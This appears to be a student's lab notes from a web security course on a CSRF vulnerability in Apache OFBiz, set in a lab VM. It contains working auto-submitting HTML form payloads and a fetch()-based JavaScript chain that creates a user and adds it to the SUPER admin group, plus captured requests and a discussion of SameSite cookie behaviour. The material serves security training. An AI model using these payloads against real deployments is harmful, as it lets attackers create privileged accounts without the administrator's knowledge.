## 6.4. Case Study: Apache OFBiz

This Learning Unit covers the following Learning Objectives:

1. Discover a CSRF vulnerability in a real-world web application
2. Exploit a CSRF vulnerability to create a new user
3. Use JavaScript to chain multiple CSRF requests
4. Understand how the SameSite attribute influences different versions of CSRF attacks

We will examine a CSRF vulnerability inÂ _Apache OFBiz_,[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/case-study-apache-ofbiz-31285/case-study-apache-ofbiz-31503#fn-local_id_328-1)Â an open source ERP application. Before we start, we'll need to make sure we can access the Apache OFBiz VM.

------------
#### 6.4.1 Cross-Site Request Forgery (CSRF)

We'll access Apache OFBiz via anÂ /etc/hostsÂ file entry on our Kali Linux VM.

```bash
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.110  ofbiz
```

Let's start the virtual machine below and make the corresponding IP address update on our Kali machine before starting our work. We'll use this VM throughout this whole Learning Unit.

We can access the web application interface at the URL below.

| URL                         | Username | Password |
| --------------------------- | -------- | -------- |
| https://ofbiz:8443/webtools | admin    | ofbiz    |
##### Labs
![[Pasted image 20240812193911.png]]
![[Pasted image 20240812193938.png]]


------------
#### 6.4.2 Apache OFBiz - Discovery
We will start by opening Burp Suite and its embedded browser. Next, we will access the login page atÂ `https://ofbiz:8443/webtools/control/checkLogin`.
`admin:ofbiz`
![[Pasted image 20240812194237.png]]
We will enter the provided credentials and clickÂ _Login_. Before we continue exploring the application, let's inspect the server response for our login request. We can find the request and response toÂ `/webtools/control/login`Â on the HTTP history tab.

Response headers for login request:

```http
HTTP/1.1 200 
**Set-Cookie: JSESSIONID=289957A01AEF4C404F221CA5346C8E1A.jvm1; Path=/webtools; Secure; HttpOnly**
**Set-Cookie: OFBiz.Visitor=10600; Max-Age=31536000; Expires=Wed, 15-Jun-2022 20:05:33 GMT; Path=/; Secure; HttpOnly**
x-frame-options: sameorigin
strict-transport-security: max-age=31536000; includeSubDomains
x-content-type-options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer-when-downgrade
Content-Security-Policy-Report-Only: default-src 'self'
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Date: Tue, 15 Jun 2021 20:05:33 GMT
Connection: close
Content-Length: 23167
```

---------------

The response to our login request contains two cookies, neither of which seem to be CSRF tokens. Also, the cookies do not have theÂ _SameSite_Â attribute set.

One area that can be effective to target with CSRF attacks is user creation. If we can trick an `admin user to execute our payload`, we can create new users, potentially with elevated permissions or roles.

Let's figure out how to create new users in OFBiz. We'll start by clicking onÂ _Security_.

![[Pasted image 20240812194554.png]]
Next, we'll click onÂ _Create New_.
![[Pasted image 20240812194614.png]]
We'll submit this form with some simple data in it. Let's use `test` for the username and `password` for the password, then clickÂ _Save_Â to submit the form.
![[Pasted image 20240812194648.png]]
Let's examine the POST request in Burp Suite. We can find the request toÂ `/webtools/control/createUserLogin`Â on the HTTP history tab.

```http
POST /webtools/control/createUserLogin HTTP/1.1

Host: ofbiz:8443
Cookie: JSESSIONID=0E8428C000456CB64C11353D294E78F4.jvm1; OFBiz.Visitor=10000
Content-Length: 178
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: https://ofbiz:8443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ofbiz:8443/webtools/control/createnewlogin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

enabled=&partyId=&userLoginId=test&currentPassword=password&currentPasswordVerify=password&passwordHint=&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=
```
---------------

The POST body contains a few parameters that were not visible on the web page, but none of them contain anything that resembles a CSRF token. There are no additional headers beyond what Chromium has added. We should be able to craft a CSRF payload that will create a new user.

Before we do that, let's figure out how to add a user to a security group. Let's click onÂ _Find Security Group_.

![[Pasted image 20240812194900.png]]
The resulting page lists out the various security roles in the application.
![[Pasted image 20240812194941.png]]
After reading through the descriptions and clickingÂ _Next_Â twice, we find the "SUPER" role.
![[Pasted image 20240812194959.png]]
Based on its description, we will target the `SUPER` role. The options available to us in this section of the application change based on what we last clicked on. Let's click onÂ _SUPER_Â to get options for security groups.
![[Pasted image 20240812195032.png]]
We now have several new buttons. Next, we'll click on the newÂ _User Logins_Â button.
![[Pasted image 20240812195135.png]]
Let's add our test user in the User Login ID field and then clickÂ _Add_.

![[Pasted image 20241115003603.png]]

Our test user has now been added to the SUPER group. Let's inspect the POST request that we just sent to the web application.
![[Pasted image 20240812195300.png]]

```http
POST /webtools/control/addUserLoginToSecurityGroup HTTP/1.1
Host: ofbiz:8443
Cookie: JSESSIONID=0E8428C000456CB64C11353D294E78F4.jvm1; OFBiz.Visitor=10000
Content-Length: 80
Cache-Control: max-age=0
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: https://ofbiz:8443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ofbiz:8443/webtools/control/EditSecurityGroupUserLogins?groupId=SUPER
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

**groupId=SUPER&userLoginId=test&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=**
```

The POST body and headers do not contain anything that resembles a CSRF token, so we should be able to exploit this functionality as well. We will exploit what we have discovered in the next section.

-----------------------
#### 6.4.3 Apache OFBiz - Exploitation
Now that we've inspected the application and determined that it is likely vulnerable to CSRF, let's work on how we can exploit the vulnerability. At a high-level, we want to copy the HTML forms from the application in to pages we can host on our own server. We'll populate the forms with our own data and make the forms submit on page load, so the victim user must only open the page for our exploit to work. We'll be playing the roles of attacker and victim in this section. Our overall goal is to exploit CSRF to create a new user and then assign them to the `SUPER` security group.

Let's start by building a small HTML page to exploit the CSRF vulnerabilities in this application to add a new user. We'll start with the basic structure of a form element and JavaScript to submit the form on page load. Let's create a file namedÂ `ofbiz.html`Â inÂ `/var/www/html`Â so that later on, we can use Apache to serve the page.

CSRF Payload:
```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
  </form>
</body>
</html>
```

Now that we have the basic structure, let's add the input elements. The `POST` request that our page generates needs to match the baseline request from the web application. We will need to add input elements, one for each key value pair in the original request, inside the the form element.

The code `html` code is a transformation from the `/webtools/control/createUserLogin` field
![[Pasted image 20240812202522.png]]
Completed `CSRF Payload` - the `input` code has to go inside the `</form>`
```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">
  </form>
</body>
</html>
```
Created `ofbiz.html`
![[Pasted image 20240812203012.png]]
copied the file to `/var/www/html`
![[Pasted image 20240812203147.png]]
While we won't be going into all the specifics of creating a realistic phishing page, we will use hidden input fields to disguise our form. Our page will appear blank when opened in a browser.

Let's test our CSRF page. First, let's make sure we have Apache running on our Kali VM.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[13Aug2024 18:14:57]-[/home/kali]
â””â”€# systemctl restart apache2
```
Next, we'll need to make sure our session in OFBiz is still active. Once we've logged in to OFBiz, we'll open a new tab in our browser and browse to our CSRF page in the new tab. Since our form autosubmits, our browser will be redirected to the Update User Login Security Settings page.


Ensure that the page is refreshed/new with logging in as `admin:ofbiz`
![[Pasted image 20240813144547.png]]
In a new page navigate to the kali hosted `ofbiz.html` page `https://192.168.45.175/ofbiz.html` which is hosted in the web root, this gets redirected to `https://ofbiz:8443/webtools/control/createUserLogin` once the form is read which is the image below - you can see that the `csrftest` user was created
![[Pasted image 20240813144915.png]]
When reviewing the `burpsuite` requests we can see the `GET` request navigating to `http://192.168.45.175/ofbiz.html` sets creates the user login `csrftest:password`
![[Pasted image 20240813145239.png]]
The next packet shows the follow on from the `GET` request above as a `POST` request, which is telling the server that the `REFERER: 192.168.45.175` is creating the user `csrftest:password` on the `https://ofbiz:8443/webtools/control/createUserLogin` page - in the `RESPONSE` we can also see the `COOKIE`
![[Pasted image 20240813145456.png]]
The application created our new user. Let's review the flow in Burp Suite as well to make sure we understand what happened here. We will click on theÂ _Proxy_Â tab followed by theÂ _HTTP History_Â tab to inspect our traffic.
![[Pasted image 20240813145740.png]]
After loading our CSRF payload page, our browser sent a POST request to the OFBiz application. TheÂ _Origin_Â andÂ _Referer_Â headers on our request indicate that the request originated fromÂ `http://localhost`. Our session cookie was included on the request. The server processed the request and created our new user.

We need a second POST request to add the new user to a security group. To do so, we could try to phish a user to a second exploit page. Alternatively, we could have one page that uses two forms to make POST requests. However, this setup could cause problems. We can use JavaScript to submit the forms, but the timing of the POST requests is important. We need the application to process our first request to create the user before we can add the user to a group.

Let's copy our existing HTML page into a new file namedÂ `ofbiz1.html`.
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[13Aug2024 00:31:27]-[/var/www/html]
â””â”€# cp /var/www/html/ofbiz.html /var/www/html/ofbiz1.html
â”Œâ”€â”€(rootðŸ’€gobots)-[13Aug2024 18:59:42]-[/var/www/html]
â””â”€# ls
ofbiz.html  ofbiz1.html

```
We'll start by adding a new form within the HTML body after our existing form. This form will handle adding our user to the SUPER group. Since we'll be attempting to submit two forms, we'll set the target of both forms to "_blank" so that the browser opens the results in new tabs. We will need to add this to the original form as well.

Addition to add:
```html
<form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
<input type="hidden" name="userLoginId" value="csrftest">
<input type="hidden" name="partyId">
<input type="hidden" name="groupId" value="SUPER">
<input type="hidden" name="fromDate_i18n">
<input type="hidden" name="fromDate">
<input type="hidden" name="thruDate_i18n">
<input type="hidden" name="thruDate">
</form>
```
ofbiz1.html ( addition added )
```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf" target="_blank">
    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">
  </form>
  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
<input type="hidden" name="userLoginId" value="csrftest">
<input type="hidden" name="partyId">
<input type="hidden" name="groupId" value="SUPER">
<input type="hidden" name="fromDate_i18n">
<input type="hidden" name="fromDate">
<input type="hidden" name="thruDate_i18n">
<input type="hidden" name="thruDate">
  </form>
</body>
</html>

```
Next, we'll create a JavaScript function to submit the forms. We will need to add aÂ _head_Â element to contain our script and update the body tag'sÂ _onload_Â event to call the new JavaScript function.
Addition to add:
```html
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    document.forms['csrf2'].submit();
    return false;
  }
</script>
</head>
<body onload="submitForms();" >
```
ofbiz1.html ( addition added )
```html
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    document.forms['csrf2'].submit();
    return false;
  }
</script>
</head>
<body onload="submitForms();" >
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf" target="_blank">
    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">
  </form>
  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
<input type="hidden" name="userLoginId" value="csrftest">
<input type="hidden" name="partyId">
<input type="hidden" name="groupId" value="SUPER">
<input type="hidden" name="fromDate_i18n">
<input type="hidden" name="fromDate">
<input type="hidden" name="thruDate_i18n">
<input type="hidden" name="thruDate">
  </form>
</body>
</html>
```
This approach is problematic. Some JavaScript calls can be asynchronous, meaning that the forms might be submitted essentially at the same time. If the server processes the second form request first, it will fail since the first form contains our new user. This might occur if the target user's internet connection isn't stable. We will revise this attack later on, but let's try it as-is now. We'll need to make sure our session in OFBiz is still active before loading our new CSRF page in a new tab.


Logging in fresh before trying new `csrf` form `ofbiz1.html`:  with `admin:ofbiz` credentials
![[Pasted image 20240813153130.png]]
entering location of where the `csrf html` script is being hosted on my local machine
![[Pasted image 20240813153346.png]]
upon hitting enter two new tabs open thanks to the `_blank` field that we included

The 1st tab is attempting to create the `csrftest` user with the 1st form of the `html`
![[Pasted image 20240813155229.png]]
The 2nd tab is adding that `csrf` user to the `Super User group`
![[Pasted image 20240813155507.png]]
To keep note of what happened in the tab that the exploit was utilized in: it is blank
![[Pasted image 20240813155715.png]]
Our payload opened two new tabs, the second of which is on the Edit User Login Security Groups page. It seems our attack worked, but we can verify it by logging out of our current session and then logging in using the newly-created account.

We'll click on the portrait in the upper right hand corner and then clickÂ _Logout_. On the resulting page, we'll clickÂ _Login_Â to return to the login page and submit the credentials for the account we created with the CSRF attack.

Was able to login with the newly added credentials `csrftest:password` to prove that it worked
![[Pasted image 20240813155920.png]]

Analyzing the `Burpsuite` packet requests:

Upon hitting enter in the web page tab to start the exploit with `http://192.168.45.175/ofbiz1.html` we can see the initial `GET` request as well as the `ofbiz1.html` script that we are utilizing to create the `csrf` user and add that user to the `super user` group with `form1` and `form2` 
![[Pasted image 20240813160323.png]]
this leads to the first `POST` request following the `GET` request which is applying the `csrftest` user creation as well as assigning the `SESSION COOKIE`
![[Pasted image 20240813160912.png]]
The following `POST` request shows that the `csrftest` user is being added to the `SUPER` group with the same `SESSION COOKIE` as the one from the last request
![[Pasted image 20240813161343.png]]
Excellent. Our attack worked, but our payload is a little noisy as it opened multiple pages. We may have been lucky on timing of the requests, so we will revise our attack to be more reliable in the next section.

Before continuing to the next section, make sure to follow the steps above and exploit the CSRF vulnerability to create a new user and add that user to the SUPER group.


-----------------------
#### 6.4.4 Revising the CSRF Payload

Rather than use two forms, let's use JavaScript to make the requests directly without navigating the browser away from our payload page. We'll create a new HTML page namedÂ `ofbiz2.html`Â inÂ /var/www/html.

We'll start with the basic structure and some common variables.

*Basic HTML and JavaScript structure for ofbiz2.html*
```js
<html>
<head>
<script>
  var username = "csrftest2";
  var password = "password";
  var host = "https://ofbiz:8443";
  var create_url = "/webtools/control/createUserLogin";
  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
  var admin_params = "userLoginId=" +username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";
</script>
</head>
<body></body>
</html>
```

Our file starts by declaring several variables within the script block. Using variables in this way allows the exploit to be more modular and easier to update.

Next, we'll create two functions within the script tags. The first function will send the request to create a new user. The second function will send the request to add the new user to the SUPER security group. Finally, we'll explicitly call our first function at the end of the script block so that a browser will execute our code when it loads the page.

*JavaScript functions to create a new user and add that user to SUPER group*
```js
function send_create() { 
  console.log("Creating user..."); 
  fetch(host+create_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response) {
    send_admin();
  }); 
}

function send_admin() { 
  console.log("Adding admin role..."); 
  fetch(host+admin_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded' 
    },
    body : admin_params }
  ).then(
    console.log("Should be done...") 
  );
}

send_create();
</script>
```
Script Combined into `ofbiz2.html` and saved into `/var/www/html/`
```js
<html>
<head>
<script>
  // Define variables
  var username = "csrftest2";
  var password = "password";
  var host = "https://ofbiz:8443";
  var create_url = "/webtools/control/createUserLogin";
  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
  var admin_params = "userLoginId=" + username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";

  // Function to create user
  function send_create() { 
    console.log("Creating user..."); 
    fetch(host + create_url, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body : create_params
    }).then(function(response) {
      send_admin();
    }); 
  }

  // Function to add admin role
  function send_admin() { 
    console.log("Adding admin role..."); 
    fetch(host + admin_url, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body : admin_params
    }).then(
      console.log("Should be done...") 
    );
  }

  // Call the create function to start the process
  send_create();
</script>
</head>
<body></body>
</html>
```

We're using the Fetch API to send our POST requests in the "no-cors" mode. This restricts us to using "application/x-www-form-urlencoded" as our Content Type, which should be fine since the baseline request used that value. We'll setÂ _credentials_[1](https://portal.offsec.com/courses/web-200-28380/learning/cross-origin-attacks-30961/case-study-apache-ofbiz-31285/revising-the-csrf-payload-30976#fn-local_id_314-1)Â to "include" to instruct the browser to send cookies on the request. Despite this setting, there are situations where the browser might not send cookies on a request depending on the CORS settings of the requested domain and theÂ _SameSite_Â attribute of any cookie. We'll explore CORS later on in this Learning Module.

Once again, we need to have an active session in OFBiz before loading our CSRF page.

Let's check in Burp Suite to determine if our JavaScript worked and made our browser send the requests.

**Exploit start**

login with `admin:ofbiz`
![[Pasted image 20240813163553.png]]
Open a new tab and enter `http://192.168.45.175/ofbiz2.html`
![[Pasted image 20240813163703.png]]
upon hitting enter the page goes blank
![[Pasted image 20240813163804.png]]
It seems that our browser did not include any cookies on the request. Let's check our browser's console for any errors. We can open it with the shortcutÂ `CTRL + SHIFT + I`Â and then clickingÂ _Console_.
![[Pasted image 20240813163925.png]]
Some messages were moved to the Issues panel. Let's click onÂ _View issues_Â to get more details and then click on the disclosure widgets to expand the details and affected cookies.
*what popped up for me:*
![[Pasted image 20240813164832.png]]*what was supposed to pop:*
![[Pasted image 20240813164924.png]]
Our browser did not send the cookies because they do not have theÂ _SameSite_Â attribute set. Chromium defaults cookies without this attribute toÂ _SameSite=Lax_, which prevents the cookies from being sent in cross-site contexts.

Let's review what cookies are set by OFBiz. We can check our most recent failed CSRF attack since cookies are set on the response.
![[Pasted image 20240813165034.png]]
OFBiz uses the JSESSIONID cookie to track user sessions. The cookie is set without specifying theÂ _SameSite_Â attribute.

Let's test how our attack works if we manually setÂ _SameSite_Â to "None" in our browser developer tools. We'll need to switch to the tab with OFBiz loaded and open Developer tools again. This next step will be easier if we move the Developer tools to the bottom of our browser window. We can do this by clicking on the three dots and clickingÂ _Dock to bottom_.

![[Pasted image 20240813165155.png]]
Next, we'll click onÂ _Application_, thenÂ _Cookies_, and finallyÂ `https://ofbiz:8443`Â to access the cookies set by the OFBiz application.
![[Pasted image 20240813165307.png]]
We can now return to the browser tab that has our CSRF page open and refresh it. Let's check Burp Suite to determine if our browser sent the `JSESSIONID` cookie this time.

***In order to get this to work, I had to `TURN OFF COOKIE PROTECTION` in the browser that the `PAYLOAD` was running in***
![[Pasted image 20240813170030.png]]
Now looking at the `POST` `REQUESTS` we can see that the cookie is the same, therefore enabling the exploit

Initial `GET` `REQUEST`
![[Pasted image 20240813170918.png]]
Create `CSRF2TEST` user `POST` and can see the `COOKIE` in request
![[Pasted image 20240813170959.png]]
Adding the `csrf2test` user to the `SUPER` group can see its the same `COOKIE`
![[Pasted image 20240813171101.png]]
Logging in with `csrftest2:password` credentials
![[Pasted image 20240813171258.png]]
Can see that was able to login and have `SUPER` privileges as the `csrftest2` user
![[Pasted image 20240813171411.png]]